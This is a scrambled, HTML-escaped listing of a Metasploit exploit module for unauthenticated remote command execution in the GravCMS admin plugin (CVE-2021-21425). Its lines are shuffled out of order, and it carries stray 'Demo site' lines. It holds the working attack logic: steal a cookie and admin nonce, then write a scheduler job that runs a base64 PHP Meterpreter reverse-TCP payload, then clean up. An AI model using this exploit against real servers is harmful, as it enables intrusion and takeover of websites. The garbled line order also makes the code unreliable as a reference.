@@ -1,0 +1,109 @@
++++++++++++++[ Sun May  9 16:23:25 +06 2021 ]++++++++++++++++
+
+	
+
+            &#039;Encoder&#039; =&gt; &#039;php/base64&#039;,
+            &#039;Mehmet Ince &lt;mehmet@mehmetince.net&gt;&#039; # author &amp; msf module
+            &#039;WfsDelay&#039; =&gt; 90
+            &#039;payload&#039; =&gt; &#039;php/meterpreter/reverse_tcp&#039;,
+            CONFIG_CHANGES # user/config/scheduler.yaml
+            [&#039;CVE&#039;, &#039;2021-21425&#039;],
+            [&#039;URL&#039;, &#039;https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/&#039;]
+          &#039;Reliability&#039; =&gt; [REPEATABLE_SESSION],
+          &#039;SideEffects&#039; =&gt; [
+          &#039;Stability&#039; =&gt; [CRASH_SAFE],
+          Grav Admin Plugin is an HTML user interface that provides a way to configure Grav and create and modify pages.
+          In versions 1.10.7 and earlier, an unauthenticated user can execute some methods of administrator controller without
+          This module exploits arbitrary config write/update vulnerability to achieve remote code execution.
+          Unauthenticated users can execute a terminal command under the context of the web server user.
+          [
+          ]
+          ],
+          an adversary can change some part of the webpage, or hijack an administrator account, or execute operating system command
+          existing YAML files on the system. Successfully exploitation of that vulnerability results in configuration changes,
+          needing any credentials. Particular method execution will result in arbitrary YAML file creation or content change of
+          such as general site information change, custom scheduler job definition, etc. Due to the nature of the vulnerability,
+          under the context of the web-server user.
+          {
+          },
+        &#039;Arch&#039; =&gt; ARCH_PHP,
+        &#039;Author&#039; =&gt;
+        &#039;DefaultOptions&#039; =&gt;
+        &#039;DefaultTarget&#039; =&gt; 0,
+        &#039;Description&#039; =&gt; %q{
+        &#039;DisclosureDate&#039; =&gt; &#039;2021-03-29&#039;,
+        &#039;License&#039; =&gt; MSF_LICENSE,
+        &#039;Name&#039; =&gt; &#039;GravCMS Remote Command Execution&#039;,
+        &#039;Notes&#039; =&gt; {
+        &#039;Platform&#039; =&gt; [&#039;php&#039;],
+        &#039;Privileged&#039; =&gt; true,
+        &#039;References&#039; =&gt;
+        &#039;Targets&#039; =&gt; [ [&#039;Automatic&#039;, {}] ],
+        &#039;admin-nonce&#039; =&gt; @admin_nonce,
+        &#039;task&#039; =&gt; &#039;SaveDefault&#039;,
+        &quot;data[custom_jobs][#{@task_name}][args]&quot; =&gt; &quot;-r #{payload.encoded}&quot;,
+        &quot;data[custom_jobs][#{@task_name}][at]&quot; =&gt; &#039;* * * * *&#039;,
+        &quot;data[custom_jobs][#{@task_name}][command]&quot; =&gt; &#039;/usr/bin/php&#039;,
+        &quot;data[custom_jobs][#{@task_name}][output]&quot; =&gt; &#039;&#039;,
+        &quot;data[custom_jobs][#{@task_name}][output_mode]&quot; =&gt; &#039;append&#039;
+        &quot;data[status][#{@task_name}]&quot; =&gt; &#039;enabled&#039;
+        &quot;data[status][#{@task_name}]&quot; =&gt; &#039;enabled&#039;,
+        info,
+        }
+        },
+      &#039;cookie&#039; =&gt; @cookie,
+      &#039;method&#039; =&gt; &#039;GET&#039;,
+      &#039;method&#039; =&gt; &#039;POST&#039;,
+      &#039;uri&#039; =&gt; normalize_uri(target_uri.path, &#039;admin&#039;)
+      &#039;uri&#039; =&gt; normalize_uri(target_uri.path, &#039;admin&#039;, &#039;config&#039;, &#039;scheduler&#039;),
+      &#039;vars_post&#039; =&gt; {
+      )
+      CheckCode::Appears
+      CheckCode::Safe
+      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;
+      fail_with Failure::UnexpectedReply, &#039;The server sent a response, but cookie and token was not found.&#039;
+      print_good &#039;Cookie and CSRF token successfully extracted !&#039;
+      print_good &#039;Scheduler successfully created ! Wait for 1 minute...&#039;
+      print_good &#039;The scheduler config successfully cleaned up!&#039;
+      update_info(
+      }
+    # Cookie must contain grav-site-az09-admin and admin-nonce form field must contain value
+    # During the fix, developers changed admin-nonce to login-nonce.
+    # Msf PHP payload does not contain quotes for many good reasons. But a single quote will surround PHP binary&#039;s
+    # Thanks to the YAML update method, we can remove the command details from the config file just by re-enabling
+    # parameter due to the command execution library of the GravCMS. For that reason, surrounding base64 part of the
+    # payload with a double quote is necessary to command executed successfully.
+    # the scheduler without any parameter:) It will leave the only command name in the config file.
+    )
+    @admin_nonce = res.get_hidden_inputs.first[&#039;admin-nonce&#039;]
+    @cookie = res.get_cookies
+    @task_name = Rex::Text.rand_text_alpha_lower(5)
+    capture_cookie_token
+    else
+    end
+    if res &amp;&amp; !res.get_hidden_inputs.first[&#039;admin-nonce&#039;].nil?
+    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.include?(&#039;Successfully saved&#039;)
+    if res &amp;&amp; res.get_cookies =~ /grav-site-[a-z0-9]+-admin=(\S*);/ &amp;&amp; !res.get_hidden_inputs.first[&#039;admin-nonce&#039;].nil?
+    payload.encoded.sub! &#039;));&#039;, &#039;&quot;));&#039;
+    payload.encoded.sub! &#039;base64_decode(&#039;, &#039;base64_decode(&quot;&#039;
+    print_status &#039;Cleaning up the the scheduler...&#039;
+    print_status &#039;Implanting payload via scheduler feature&#039;
+    print_status &#039;Sending request to the admin path to generate cookie and token&#039;
+    res = send_request_cgi(
+    super(
+    unless check == CheckCode::Appears
+  Rank = NormalRanking
+  def capture_cookie_token
+  def check
+  def exploit
+  def initialize(info = {})
+  def on_new_session
+  end
+  include Msf::Exploit::Remote::HttpClient
+# Current source: https://github.com/rapid7/metasploit-framework
+# This module requires Metasploit: https://metasploit.com/download
+##
+Demo site:  https://github.com/rapid7/metasploit-framework
+Demo site:  https://metasploit.com/download
+Demo site: https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/]
+class MetasploitModule &lt; Msf::Exploit::Remote
